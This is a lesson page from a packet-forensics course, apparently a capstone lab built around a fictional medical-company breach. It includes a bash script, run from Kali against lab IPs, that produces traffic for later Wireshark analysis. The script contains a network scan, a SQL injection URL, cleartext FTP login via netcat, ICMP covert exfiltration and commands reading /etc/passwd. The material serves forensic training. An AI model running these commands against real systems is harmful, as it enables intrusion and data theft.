# 10.01: Capstone Scenario: Operation MedTech Breach

**Level:** 🔴 Pro | **Time:** 3–4 h | **XP:** 250

```
   ┌──────────────────────────────────────────────────────────────┐
   │            INCIDENT DISPATCH - TIER 3 ESCALATION             │
   │  Case: INC-2026-8819 | Priority: P1 - CRITICAL BREACH        │
   │  Victim: MedTech Innovations AG (Frankfurt am Main)          │
   └──────────────────────────────────────────────────────────────┘
```

---

## 1. Executive Briefing & Incident Background

At **06:45 UTC**, the Chief Information Security Officer (CISO) of **MedTech Innovations AG** received an emergency phone call from the German Federal Office for Information Security (BSI) and a hospital partner:
> *"Confidential surgical implant patient records and proprietary firmware schematics belonging to MedTech have been posted for sale on a darknet extortion forum. The threat actor claims full internal domain compromise."*

The internal SOC was alerted, but the attackers wiped local event logs on all compromised Windows and Linux servers using automated anti-forensics scripts.

**The Only Remaining Evidence:**
The network engineering team had an active full-packet capture (PCAP) recording on the internal core switch trunk port (`enp0s3` / `labnet`) spanning the entire breach window.

You have been retained as the **Lead External Forensic Investigator**. Your objective is to reconstruct the breach from the raw packet evidence, identify the compromised assets, trace the lateral movement, quantify exfiltrated data, and write the emergency Board Briefing.

---

## 2. Lab Environment Topology

```
                  Attacker Machine / Rogue Actor
                         10.10.10.10 (Kali)
                                  │
      ═════════════════════ Core Switch (labnet) ═════════════════════
         │                                │                        │
   ubuntu-srv                      metasploitable2            win-client
   10.10.10.20                     10.10.10.30                10.10.10.40
   Internal Medical Web Portal     Legacy Firmware Server     Employee Workstation
   (Apache, FTP, DNS)              (Vulnerable Target)        (Workstation)
```

### Known Enterprise Assets:
| Hostname | IP Address | Operating System | Function |
|---|---|---|---|
| `kali` | `10.10.10.10` | Kali Linux | Suspected rogue actor / breach origin |
| `ubuntu-srv` | `10.10.10.20` | Ubuntu 24.04 LTS | Intranet portal, DNS, FTP backup store |
| `metasploitable2` | `10.10.10.30` | Linux 2.6.24 | Legacy medical firmware testing server |
| `win-client` | `10.10.10.40` | Windows 10/11 | Finance & HR workstation |

---

## 3. Simulating the Capstone Attack in Your Lab

To perform this capstone investigation with live, freshly generated packets in your VirtualBox home lab, run the automated attack simulation script provided below from **Kali**.

### Step 1: Start Wireshark Capture on Kali
1. Launch Wireshark on Kali, interface: `eth0`.
2. Ensure promiscuous mode is enabled.
3. Save the capture as `~/packet-ninja/captures/capstone_breach.pcapng`.

### Step 2: Execute the Incident Generator
Run this automated script on **Kali** to generate the authentic multi-stage attack traffic:

```bash
#!/usr/bin/env bash
# === CAPSTONE BREACH TRAFFIC GENERATOR ===
TARGET="10.10.10.20"
MSF="10.10.10.30"

echo "[*] Phase 1: Reconnaissance Sweep..."
nmap -sn 10.10.10.0/24 >/dev/null 2>&1
sudo nmap -sS -p 21,22,80,445 $TARGET >/dev/null 2>&1

echo "[*] Phase 2: Infiltration & Credential Harvesting..."
# Attacker brute-forces / sniffs cleartext FTP credentials on legacy target:
printf "USER msfadmin\r\nPASS msfadmin\r\nLIST\r\nQUIT\r\n" | nc -vn $MSF 21 >/dev/null 2>&1

echo "[*] Phase 3: Web Exploit & SQL Injection on Intranet..."
curl -s "http://$TARGET/search.php?query=1%20UNION%20SELECT%20username,password%20FROM%20users" >/dev/null

echo "[*] Phase 4: Staging Stolen Credentials via POST..."
curl -s -X POST http://$TARGET/login.html \
  -H "User-Agent: Mozilla/5.0 (Rogue-Infiltrator/2.4)" \
  -d "user=dr_evans&password=PatientRecords2026!&auth_token=SUPERSECRET" >/dev/null

echo "[*] Phase 5: Covert Data Exfiltration..."
# Attacker exfiltrates medical patient database through covert ICMP ping payload:
ping -c 4 -p "44425f455846494c5f50415449454e545f44415441" $TARGET >/dev/null 2>&1

echo "[*] Phase 6: Interactive Reverse Shell Execution..."
# Attacker executes commands over reverse shell:
(echo "whoami"; sleep 1; echo "cat /etc/passwd | head -3"; sleep 1; echo "exit") | nc -vn $MSF 21 >/dev/null 2>&1

echo "[+] Capstone Incident Generation Complete! Stop your Wireshark capture now."
```

*(You can also find this script in [`resources/scripts/simulate-capstone-breach.sh`](../resources/scripts/simulate-capstone-breach.sh)).*

---

## 4. Your Investigation Assignment

Proceed immediately to **[02 Investigation Workbook](02-investigation-workbook.md)**:
- Open `capstone_breach.pcapng` in Wireshark.
- Answer the 15 forensic challenge questions across all 6 attack phases.
- Extract the exfiltrated patient records file.
- Draft the emergency CISO executive briefing!

---
⬅️ [Module 09](../09-Professional-Practice/03-careers-and-certifications.md) | ➡️ [02 Investigation Workbook](02-investigation-workbook.md)
